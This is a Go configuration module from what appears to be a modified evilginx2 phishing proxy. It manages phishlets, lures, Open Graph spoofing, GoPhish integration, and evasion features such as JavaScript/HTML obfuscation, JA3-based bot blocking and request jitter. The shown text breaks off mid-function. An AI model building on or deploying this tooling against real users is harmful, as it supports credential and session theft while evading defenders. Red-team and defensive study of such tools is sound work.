package core

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"strings"

	"github.com/kgretzky/evilginx2/log"

	"github.com/spf13/viper"
)

var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}

type Lure struct {
	Id              string `mapstructure:"id" json:"id" yaml:"id"`
	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	Path            string `mapstructure:"path" json:"path" yaml:"path"`
	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
	Info            string `mapstructure:"info" json:"info" yaml:"info"`
	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
	Proxy           string `mapstructure:"proxy" json:"proxy" yaml:"proxy"`
}

type SubPhishlet struct {
	Name       string            `mapstructure:"name" json:"name" yaml:"name"`
	ParentName string            `mapstructure:"parent_name" json:"parent_name" yaml:"parent_name"`
	Params     map[string]string `mapstructure:"params" json:"params" yaml:"params"`
}

type PhishletConfig struct {
	Hostname  string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
	Domain    string `mapstructure:"domain" json:"domain" yaml:"domain"`
	Proxy     string `mapstructure:"proxy" json:"proxy" yaml:"proxy"`
}

type ProxyConfig struct {
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
	Enabled  bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
}

type BlacklistConfig struct {
	Mode string `mapstructure:"mode" json:"mode" yaml:"mode"`
}

type CertificatesConfig struct {
}

type GoPhishConfig struct {
	AdminUrl    string `mapstructure:"admin_url" json:"admin_url" yaml:"admin_url"`
	ApiKey      string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	InsecureTLS bool   `mapstructure:"insecure" json:"insecure" yaml:"insecure"`
}

type GeneralConfig struct {
	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
	EncKey       string `mapstructure:"enc_key" json:"enc_key" yaml:"enc_key"`
	ServerName   string `mapstructure:"server_name" json:"server_name" yaml:"server_name"`
}

type ObfuscationConfig struct {
	JsLevel  string `mapstructure:"js_level" json:"js_level" yaml:"js_level"`
	HtmlEnabled bool `mapstructure:"html_enabled" json:"html_enabled" yaml:"html_enabled"`
}

type SpoofConfig struct {
	Enabled bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	SpoofUrl string `mapstructure:"spoof_url" json:"spoof_url" yaml:"spoof_url"`
}

type BotguardConfig struct {
	Enabled        bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	JsChallenge    bool     `mapstructure:"js_challenge" json:"js_challenge" yaml:"js_challenge"`
	BlockedJa3     []string `mapstructure:"blocked_ja3" json:"blocked_ja3" yaml:"blocked_ja3"`
	AllowedJa3     []string `mapstructure:"allowed_ja3" json:"allowed_ja3" yaml:"allowed_ja3"`
}

type ApiConfig struct {
	Enabled    bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	ApiKey     string `mapstructure:"api_key" json:"api_key" yaml:"api_key"`
	SecretPath string `mapstructure:"secret_path" json:"secret_path" yaml:"secret_path"`
}

type JitterConfig struct {
	Enabled bool `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	MinMs   int  `mapstructure:"min_ms" json:"min_ms" yaml:"min_ms"`
	MaxMs   int  `mapstructure:"max_ms" json:"max_ms" yaml:"max_ms"`
}

type NotifierConfig struct {
	Name     string            `mapstructure:"name" json:"name" yaml:"name"`
	Type     string            `mapstructure:"type" json:"type" yaml:"type"`
	Enabled  bool              `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	Triggers []string          `mapstructure:"triggers" json:"triggers" yaml:"triggers"`
	Config   map[string]string `mapstructure:"config" json:"config" yaml:"config"`
}

type NamedProxy struct {
	Name     string `mapstructure:"name" json:"name" yaml:"name"`
	Type     string `mapstructure:"type" json:"type" yaml:"type"`
	Address  string `mapstructure:"address" json:"address" yaml:"address"`
	Port     int    `mapstructure:"port" json:"port" yaml:"port"`
	Username string `mapstructure:"username" json:"username" yaml:"username"`
	Password string `mapstructure:"password" json:"password" yaml:"password"`
}

type Config struct {
	general            *GeneralConfig
	certificates       *CertificatesConfig
	blacklistConfig    *BlacklistConfig
	gophishConfig      *GoPhishConfig
	proxyConfig        *ProxyConfig
	obfuscationConfig  *ObfuscationConfig
	spoofConfig        *SpoofConfig
	botguardConfig     *BotguardConfig
	apiConfig          *ApiConfig
	jitterConfig       *JitterConfig
	notifiers          []*NotifierConfig
	namedProxies       []*NamedProxy
	phishletConfig     map[string]*PhishletConfig
	phishlets          map[string]*Phishlet
	phishletNames      []string
	activeHostnames    []string
	redirectorsDir     string
	lures              []*Lure
	lureIds            []string
	subphishlets       []*SubPhishlet
	cfg                *viper.Viper
}

const (
	CFG_GENERAL       = "general"
	CFG_CERTIFICATES  = "certificates"
	CFG_LURES         = "lures"
	CFG_PROXY         = "proxy"
	CFG_PHISHLETS     = "phishlets"
	CFG_BLACKLIST     = "blacklist"
	CFG_SUBPHISHLETS  = "subphishlets"
	CFG_GOPHISH       = "gophish"
	CFG_OBFUSCATION   = "obfuscation"
	CFG_SPOOF         = "spoof"
	CFG_BOTGUARD      = "botguard"
	CFG_API           = "api"
	CFG_JITTER        = "jitter"
	CFG_NOTIFIERS     = "notifiers"
	CFG_NAMED_PROXIES = "named_proxies"
)

const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll

func NewConfig(cfg_dir string, path string) (*Config, error) {
	c := &Config{
		general:           &GeneralConfig{},
		certificates:      &CertificatesConfig{},
		gophishConfig:     &GoPhishConfig{},
		obfuscationConfig: &ObfuscationConfig{JsLevel: JS_OBFUSCATION_OFF, HtmlEnabled: false},
		spoofConfig:       &SpoofConfig{Enabled: false, SpoofUrl: ""},
		botguardConfig:    &BotguardConfig{Enabled: false, JsChallenge: true},
		apiConfig:         &ApiConfig{Enabled: false, ApiKey: "", SecretPath: ""},
		jitterConfig:      &JitterConfig{Enabled: true, MinMs: 100, MaxMs: 300},
		notifiers:         []*NotifierConfig{},
		namedProxies:      []*NamedProxy{},
		phishletConfig:    make(map[string]*PhishletConfig),
		phishlets:         make(map[string]*Phishlet),
		phishletNames:     []string{},
		lures:             []*Lure{},
		blacklistConfig:   &BlacklistConfig{},
	}

	c.cfg = viper.New()
	c.cfg.SetConfigType("json")

	if path == "" {
		path = filepath.Join(cfg_dir, "config.json")
	}
	err := os.MkdirAll(filepath.Dir(path), os.FileMode(0700))
	if err != nil {
		return nil, err
	}
	var created_cfg bool = false
	c.cfg.SetConfigFile(path)
	if _, err := os.Stat(path); os.IsNotExist(err) {
		created_cfg = true
		err = c.cfg.WriteConfigAs(path)
		if err != nil {
			return nil, err
		}
	}

	err = c.cfg.ReadInConfig()
	if err != nil {
		return nil, err
	}

	c.cfg.UnmarshalKey(CFG_GENERAL, &c.general)
	if c.cfg.Get("general.autocert") == nil {
		c.cfg.Set("general.autocert", true)
		c.general.Autocert = true
	}

	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)

	c.cfg.UnmarshalKey(CFG_GOPHISH, &c.gophishConfig)

	if c.general.OldIpv4 != "" {
		if c.general.ExternalIpv4 == "" {
			c.SetServerExternalIP(c.general.OldIpv4)
		}
		c.SetServerIP("")
	}

	if !stringExists(c.blacklistConfig.Mode, BLACKLIST_MODES) {
		c.SetBlacklistMode("unauth")
	}

	if c.general.UnauthUrl == "" && created_cfg {
		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
	}
	if c.general.HttpsPort == 0 {
		c.SetHttpsPort(443)
	}
	if c.general.DnsPort == 0 {
		c.SetDnsPort(53)
	}
	if created_cfg {
		c.EnableAutocert(true)
	}

	c.lures = []*Lure{}
	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
	c.proxyConfig = &ProxyConfig{}
	c.cfg.UnmarshalKey(CFG_PROXY, &c.proxyConfig)
	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)

	// Load new Pro-style configs
	c.cfg.UnmarshalKey(CFG_OBFUSCATION, &c.obfuscationConfig)
	if c.obfuscationConfig == nil {
		c.obfuscationConfig = &ObfuscationConfig{JsLevel: JS_OBFUSCATION_OFF, HtmlEnabled: false}
	}
	c.cfg.UnmarshalKey(CFG_SPOOF, &c.spoofConfig)
	if c.spoofConfig == nil {
		c.spoofConfig = &SpoofConfig{Enabled: false, SpoofUrl: ""}
	}
	c.cfg.UnmarshalKey(CFG_BOTGUARD, &c.botguardConfig)
	if c.botguardConfig == nil {
		c.botguardConfig = &BotguardConfig{Enabled: false, JsChallenge: true}
	}
	c.cfg.UnmarshalKey(CFG_API, &c.apiConfig)
	if c.apiConfig == nil {
		c.apiConfig = &ApiConfig{Enabled: false}
	}
	c.cfg.UnmarshalKey(CFG_JITTER, &c.jitterConfig)
	if c.jitterConfig == nil {
		c.jitterConfig = &JitterConfig{Enabled: true, MinMs: 100, MaxMs: 300}
	}
	if c.jitterConfig.MinMs < 0 {
		c.jitterConfig.MinMs = 0
	}
	if c.jitterConfig.MaxMs < c.jitterConfig.MinMs {
		c.jitterConfig.MaxMs = c.jitterConfig.MinMs + 200
	}
	c.cfg.UnmarshalKey(CFG_NOTIFIERS, &c.notifiers)
	if c.notifiers == nil {
		c.notifiers = []*NotifierConfig{}
	}
	c.cfg.UnmarshalKey(CFG_NAMED_PROXIES, &c.namedProxies)
	if c.namedProxies == nil {
		c.namedProxies = []*NamedProxy{}
	}

	for i := 0; i < len(c.lures); i++ {
		c.lureIds = append(c.lureIds, GenRandomToken())
	}

	c.cfg.WriteConfig()
	return c, nil
}

func (c *Config) PhishletConfig(site string) *PhishletConfig {
	if o, ok := c.phishletConfig[site]; ok {
		return o
	} else {
		o := &PhishletConfig{
			Hostname:  "",
			UnauthUrl: "",
			Enabled:   false,
			Visible:   true,
		}
		c.phishletConfig[site] = o
		return o
	}
}

func (c *Config) SavePhishlets() {
	c.cfg.Set(CFG_PHISHLETS, c.phishletConfig)
	c.cfg.WriteConfig()
}

func (c *Config) SetSiteHostname(site string, hostname string) bool {
	baseDomain := c.GetPhishletDomain(site)
	if baseDomain == "" {
		log.Error("you need to set server top-level domain, first. type: config domain your-domain.com")
		return false
	}
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set hostname")
		return false
	}
	if hostname != "" && hostname != baseDomain && !strings.HasSuffix(hostname, "."+baseDomain) {
		log.Error("phishlet hostname must end with '%s'", baseDomain)
		return false
	}
	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
	c.PhishletConfig(site).Hostname = hostname
	c.SavePhishlets()
	return true
}

func (c *Config) SetSiteUnauthUrl(site string, _url string) bool {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return false
	}
	if pl.isTemplate {
		log.Error("phishlet is a template - can't set unauth_url")
		return false
	}
	if _url != "" {
		_, err := url.ParseRequestURI(_url)
		if err != nil {
			log.Error("invalid URL: %s", err)
			return false
		}
	}
	log.Info("phishlet '%s' unauth_url set to: %s", site, _url)
	c.PhishletConfig(site).UnauthUrl = _url
	c.SavePhishlets()
	return true
}

func (c *Config) SetBaseDomain(domain string) {
	c.general.Domain = domain
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server domain set to: %s", domain)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerIP(ip_addr string) {
	c.general.OldIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	//log.Info("server IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerExternalIP(ip_addr string) {
	c.general.ExternalIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server external IP set to: %s", ip_addr)
	c.cfg.WriteConfig()
}

func (c *Config) SetServerBindIP(ip_addr string) {
	c.general.BindIpv4 = ip_addr
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("server bind IP set to: %s", ip_addr)
	log.Warning("you may need to restart evilginx for the changes to take effect")
	c.cfg.WriteConfig()
}

func (c *Config) SetHttpsPort(port int) {
	c.general.HttpsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("https port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetDnsPort(port int) {
	c.general.DnsPort = port
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("dns port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) EnableProxy(enabled bool) {
	c.proxyConfig.Enabled = enabled
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	if enabled {
		log.Info("enabled proxy")
	} else {
		log.Info("disabled proxy")
	}
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyType(ptype string) {
	ptypes := []string{"http", "https", "socks5", "socks5h"}
	if !stringExists(ptype, ptypes) {
		log.Error("invalid proxy type selected")
		return
	}
	c.proxyConfig.Type = ptype
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy type set to: %s", ptype)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyAddress(address string) {
	c.proxyConfig.Address = address
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy address set to: %s", address)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPort(port int) {
	c.proxyConfig.Port = port
	c.cfg.Set(CFG_PROXY, c.proxyConfig.Port)
	log.Info("proxy port set to: %d", port)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyUsername(username string) {
	c.proxyConfig.Username = username
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy username set to: %s", username)
	c.cfg.WriteConfig()
}

func (c *Config) SetProxyPassword(password string) {
	c.proxyConfig.Password = password
	c.cfg.Set(CFG_PROXY, c.proxyConfig)
	log.Info("proxy password set to: %s", password)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishAdminUrl(k string) {
	u, err := url.ParseRequestURI(k)
	if err != nil {
		log.Error("invalid url: %s", err)
		return
	}

	c.gophishConfig.AdminUrl = u.String()
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish admin url set to: %s", u.String())
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishApiKey(k string) {
	c.gophishConfig.ApiKey = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish api key set to: %s", k)
	c.cfg.WriteConfig()
}

func (c *Config) SetGoPhishInsecureTLS(k bool) {
	c.gophishConfig.InsecureTLS = k
	c.cfg.Set(CFG_GOPHISH, c.gophishConfig)
	log.Info("gophish insecure set to: %v", k)
	c.cfg.WriteConfig()
}

func (c *Config) IsLureHostnameValid(hostname string) bool {
	for _, l := range c.lures {
		if l.Hostname == hostname {
			if c.PhishletConfig(l.Phishlet).Enabled {
				return true
			}
		}
	}
	return false
}

func (c *Config) SetSiteEnabled(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		log.Error("%v", err)
		return err
	}
	if c.PhishletConfig(site).Hostname == "" {
		return fmt.Errorf("enabling phishlet '%s' requires its hostname to be set up", site)
	}
	if pl.isTemplate {
		return fmt.Errorf("phishlet '%s' is a template - you have to 'create' child phishlet from it, with predefined parameters, before you can enable it.", site)
	}
	c.PhishletConfig(site).Enabled = true
	c.refreshActiveHostnames()
	c.VerifyPhishlets()
	log.Info("enabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteDisabled(site string) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Enabled = false
	c.refreshActiveHostnames()
	log.Info("disabled phishlet '%s'", site)

	c.SavePhishlets()
	return nil
}

func (c *Config) SetSiteHidden(site string, hide bool) error {
	if _, err := c.GetPhishlet(site); err != nil {
		log.Error("%v", err)
		return err
	}
	c.PhishletConfig(site).Visible = !hide
	c.refreshActiveHostnames()

	if hide {
		log.Info("phishlet '%s' is now hidden and all requests to it will be redirected", site)
	} else {
		log.Info("phishlet '%s' is now reachable and visible from the outside", site)
	}
	c.SavePhishlets()
	return nil
}

func (c *Config) SetRedirectorsDir(path string) {
	c.redirectorsDir = path
}

func (c *Config) ResetAllSites() {
	c.phishletConfig = make(map[string]*PhishletConfig)
	c.SavePhishlets()
}

func (c *Config) IsSiteEnabled(site string) bool {
	return c.PhishletConfig(site).Enabled
}

func (c *Config) IsSiteHidden(site string) bool {
	return !c.PhishletConfig(site).Visible
}

func (c *Config) GetEnabledSites() []string {
	var sites []string
	for k, o := range c.phishletConfig {
		if o.Enabled {
			sites = append(sites, k)
		}
	}
	return sites
}

func (c *Config) SetBlacklistMode(mode string) {
	if stringExists(mode, BLACKLIST_MODES) {
		c.blacklistConfig.Mode = mode
		c.cfg.Set(CFG_BLACKLIST, c.blacklistConfig)
		c.cfg.WriteConfig()
	}
	log.Info("blacklist mode set to: %s", mode)
}

func (c *Config) SetUnauthUrl(_url string) {
	c.general.UnauthUrl = _url
	c.cfg.Set(CFG_GENERAL, c.general)
	log.Info("unauthorized request redirection URL set to: %s", _url)
	c.cfg.WriteConfig()
}

func (c *Config) EnableAutocert(enabled bool) {
	c.general.Autocert = enabled
	if enabled {
		log.Info("autocert is now enabled")
	} else {
		log.Info("autocert is now disabled")
	}
	c.cfg.Set(CFG_GENERAL, c.general)
	c.cfg.WriteConfig()
}

func (c *Config) refreshActiveHostnames() {
	c.activeHostnames = []string{}
	sites := c.GetEnabledSites()
	for _, site := range sites {
		pl, err := c.GetPhishlet(site)
		if err != nil {
			continue
		}
		for _, host := range pl.GetPhishHosts(false) {
			c.activeHostnames = append(c.activeHostnames, strings.ToLower(host))
		}
	}
	for _, l := range c.lures {
		if stringExists(l.Phishlet, sites) {
			if l.Hostname != "" {
				c.activeHostnames = append(c.activeHostnames, strings.ToLower(l.Hostname))
			}
		}
	}
}

func (c *Config) GetActiveHostnames(site string) []string {
	var ret []string
	sites := c.GetEnabledSites()
	for _, _site := range sites {
		if site == "" || _site == site {
			pl, err := c.GetPhishlet(_site)
			if err != nil {
				continue
			}
			for _, host := range pl.GetPhishHosts(false) {
				ret = append(ret, strings.ToLower(host))
			}
		}
	}
	for _, l := range c.lures {
		if site == "" || l.Phishlet == site {
			if l.Hostname != "" {
				hostname := strings.ToLower(l.Hostname)
				ret = append(ret, hostname)
			}
		}
	}
	return ret
}

func (c *Config) IsActiveHostname(host string) bool {
	host = strings.ToLower(host)
	if host[len(host)-1:] == "." {
		host = host[:len(host)-1]
	}
	for _, h := range c.activeHostnames {
		if h == host {
			return true
		}
	}
	return false
}

func (c *Config) AddPhishlet(site string, pl *Phishlet) {
	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = pl
	c.VerifyPhishlets()
}

func (c *Config) AddSubPhishlet(site string, parent_site string, customParams map[string]string) error {
	pl, err := c.GetPhishlet(parent_site)
	if err != nil {
		return err
	}
	_, err = c.GetPhishlet(site)
	if err == nil {
		return fmt.Errorf("phishlet '%s' already exists", site)
	}
	sub_pl, err := NewPhishlet(site, pl.Path, &customParams, c)
	if err != nil {
		return err
	}
	sub_pl.ParentName = parent_site

	c.phishletNames = append(c.phishletNames, site)
	c.phishlets[site] = sub_pl
	c.VerifyPhishlets()

	return nil
}

func (c *Config) DeleteSubPhishlet(site string) error {
	pl, err := c.GetPhishlet(site)
	if err != nil {
		return err
	}
	if pl.ParentName == "" {
		return fmt.Errorf("phishlet '%s' can't be deleted - you can only delete child phishlets.", site)
	}

	c.phishletNames = removeString(site, c.phishletNames)
	delete(c.phishlets, site)
	delete(c.phishletConfig, site)
	c.SavePhishlets()
	return nil
}

func (c *Config) LoadSubPhishlets() {
	var subphishlets []*SubPhishlet
	c.cfg.UnmarshalKey(CFG_SUBPHISHLETS, &subphishlets)
	for _, spl := range subphishlets {
		err := c.AddSubPhishlet(spl.Name, spl.ParentName, spl.Params)
		if err != nil {
			log.Error("phishlets: %s", err)
		}
	}
}

func (c *Config) SaveSubPhishlets() {
	var subphishlets []*SubPhishlet
	for _, pl := range c.phishlets {
		if pl.ParentName != "" {
			spl := &SubPhishlet{
				Name:       pl.Name,
				ParentName: pl.ParentName,
				Params:     pl.customParams,
			}
			subphishlets = append(subphishlets, spl)
		}
	}

	c.cfg.Set(CFG_SUBPHISHLETS, subphishlets)
	c.cfg.WriteConfig()
}

func (c *Config) VerifyPhishlets() {
	hosts := make(map[string]string)

	for site, pl := range c.phishlets {
		if pl.isTemplate {
			continue
		}
		for _, ph := range pl.proxyHosts {
			phish_host := combineHost(ph.phish_subdomain, ph.domain)
			orig_host := combineHost(ph.orig_subdomain, ph.domain)
			if c_site, ok := hosts[phish_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", phish_host, site, c_site)
			} else if c_site, ok := hosts[orig_host]; ok {
				log.Warning("phishlets: hostname '%s' collision between '%s' and '%s' phishlets", orig_host, site, c_site)
			}
			hosts[phish_host] = site
			hosts[orig_host] = site
		}
	}
}

func (c *Config) CleanUp() {

	for k := range c.phishletConfig {
		_, err := c.GetPhishlet(k)
		if err != nil {
			delete(c.phishletConfig, k)
		}
	}
	c.SavePhishlets()
	/*
		var sites_enabled []string
		var sites_hidden []string
		for k := range c.siteDomains {
			_, err := c.GetPhishlet(k)
			if err != nil {
				delete(c.siteDomains, k)
			} else {
				if c.IsSiteEnabled(k) {
					sites_enabled = append(sites_enabled, k)
				}
				if c.IsSiteHidden(k) {
					sites_hidden = append(sites_hidden, k)
				}
			}
		}
		c.cfg.Set(CFG_SITE_DOMAINS, c.siteDomains)
		c.cfg.Set(CFG_SITES_ENABLED, sites_enabled)
		c.cfg.Set(CFG_SITES_HIDDEN, sites_hidden)
		c.cfg.WriteConfig()*/
}

func (c *Config) AddLure(site string, l *Lure) {
	c.lures = append(c.lures, l)
	c.lureIds = append(c.lureIds, GenRandomToken())
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
}

func (c *Config) SetLure(index int, l *Lure) error {
	if index >= 0 && index < len(c.lures) {
		c.lures[index] = l
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLure(index int) error {
	if index >= 0 && index < len(c.lures) {
		c.lures = append(c.lures[:index], c.lures[index+1:]...)
		c.lureIds = append(c.lureIds[:index], c.lureIds[index+1:]...)
	} else {
		return fmt.Errorf("index out of bounds: %d", index)
	}
	c.cfg.Set(CFG_LURES, c.lures)
	c.cfg.WriteConfig()
	return nil
}

func (c *Config) DeleteLures(index []int) []int {
	tlures := []*Lure{}
	tlureIds := []string{}
	di := []int{}
	for n, l := range c.lures {
		if !intExists(n, index) {
			tlures = append(tlures, l)
			tlureIds = append(tlureIds, c.lureIds[n])
		} else {
			di = append(di, n)
		}
	}
	if len(di) > 0 {
		c.lures = tlures
		c.lureIds = tlureIds
		c.cfg.Set(CFG_LURES, c.lures)
		c.cfg.WriteConfig()
	}
	return di
}

func (c *Config) GetLure(index int) (*Lure, error) {
	if index >= 0 && index < len(c.lures) {
		return c.lures[index], nil
	} else {
		return nil, fmt.Errorf("index out of bounds: %d", index)
	}
}

func (c *Config) GetLureByPath(site string, host string, path string) (*Lure, error) {
	for _, l := range c.lures {
		if l.Phishlet == site {
			pl, err := c.GetPhishlet(site)
			if err == nil {
				if host == l.Hostname || host == pl.GetLandingPhishHost() {
					if l.Path == path {
						return l, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("lure for path '%s' not found", path)
}

func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
	pl, ok := c.phishlets[site]
	if !ok {
		return nil, fmt.Errorf("phishlet '%s' not found", site)
	}
	return pl, nil
}

func (c *Config) GetPhishletNames() []string {
	return c.phishletNames
}

func (c *Config) GetSiteDomain(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.Hostname, ok
	}
	return "", false
}

func (c *Config) GetSiteUnauthUrl(site string) (string, bool) {
	if o, ok := c.phishletConfig[site]; ok {
		return o.UnauthUrl, ok
	}
	return "", false
}

func (c *Config) GetBaseDomain() string {
	return c.general.Domain
}

func (c *Config) GetServerExternalIP() string {
	return c.general.ExternalIpv4
}

func (c *Config) GetServerBindIP() string {
	return c.general.BindIpv4
}

func (c *Config) GetHttpsPort() int {
	return c.general.HttpsPort
}

func (c *Config) GetDnsPort() int {
	return c.general.DnsPort
}

func (c *Config) GetRedirectorsDir() string {
	return c.redirectorsDir
}

func (c *Config) GetBlacklistMode() string {
	return c.blacklistConfig.Mode
}

func (c *Config) IsAutocertEnabled() bool {
	return c.general.Autocert
}

func (c *Config) GetGoPhishAdminUrl() string {
	return c.gophishConfig.AdminUrl
}

func (c *Config) GetGoPhishApiKey() string {
	return c.gophishConfig.ApiKey
}

func (c *Config) GetGoPhishInsecureTLS() bool {
	return c.gophishConfig.InsecureTLS
}

// --- Obfuscation Config ---

func (c *Config) GetJsObfuscationLevel() string {
	if c.obfuscationConfig == nil {
		return JS_OBFUSCATION_OFF
	}
	return c.obfuscationConfig.JsLevel
}

func (c *Config) SetJsObfuscationLevel(level string) {
	if !stringExists(level, JS_OBFUSCATION_LEVELS) {
		log.Error("invalid JS obfuscation level: %s (valid: off, low, medium, high)", level)
		return
	}
	c.obfuscationConfig.JsLevel = level
	c.cfg.Set(CFG_OBFUSCATION, c.obfuscationConfig)
	log.Info("javascript obfuscation set to: %s", level)
	c.cfg.WriteConfig()
}

func (c *Config) IsHtmlObfuscationEnabled() bool {
	if c.obfuscationConfig == nil {
		return false
	}
	return c.obfuscationConfig.HtmlEnabled
}

func (c *Config) SetHtmlObfuscation(enabled bool) {
	c.obfuscationConfig.HtmlEnabled = enabled
	c.cfg.Set(CFG_OBFUSCATION, c.obfuscationConfig)
	if enabled {
		log.Info("html obfuscation enabled")
	} else {
		log.Info("html obfuscation disabled")
	}
	c.cfg.WriteConfig()
}

// --- Spoof Config ---

func (c *Config) IsSpoofEnabled() bool {
	if c.spoofConfig == nil {
		return false
	}
	return c.spoofConfig.Enabled
}

func (c *Config) SetSpoofEnabled(enabled bool) {
	c.spoofConfig.Enabled = enabled
	c.cfg.Set(CFG_SPOOF, c.spoofConfig)
	if enabled {
		log.Info("website spoofing enabled")
	} else {
		log.Info("website spoofing disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) GetSpoofUrl() string {
	if c.spoofConfig == nil {
		return ""
	}
	return c.spoofConfig.SpoofUrl
}

func (c *Config) SetSpoofUrl(u string) {
	c.spoofConfig.SpoofUrl = u
	c.cfg.Set(CFG_SPOOF, c.spoofConfig)
	log.Info("spoof URL set to: %s", u)
	c.cfg.WriteConfig()
}

// --- Botguard Config ---

func (c *Config) IsBotguardEnabled() bool {
	if c.botguardConfig == nil {
		return false
	}
	return c.botguardConfig.Enabled
}

func (c *Config) SetBotguardEnabled(enabled bool) {
	c.botguardConfig.Enabled = enabled
	c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)
	if enabled {
		log.Info("botguard enabled")
	} else {
		log.Info("botguard disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) IsBotguardJsChallengeEnabled() bool {
	if c.botguardConfig == nil {
		return true
	}
	return c.botguardConfig.JsChallenge
}

func (c *Config) SetBotguardJsChallenge(enabled bool) {
	c.botguardConfig.JsChallenge = enabled
	c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)
	if enabled {
		log.Info("botguard JS challenge enabled")
	} else {
		log.Info("botguard JS challenge disabled")
	}
	c.cfg.WriteConfig()
}

func (c *Config) GetBotguardBlockedJa3() []string {
	if c.botguardConfig == nil {
		return []string{}
	}
	return c.botguardConfig.BlockedJa3
}

func (c *Config) AddBotguardBlockedJa3(ja3 string) {
	if c.botguardConfig.BlockedJa3 == nil {
		c.botguardConfig.BlockedJa3 = []string{}
	}
	c.botguardConfig.BlockedJa3 = append(c.botguardConfig.BlockedJa3, ja3)
	c.cfg.Set(CFG_BOTGUARD, c.botguardConfig)
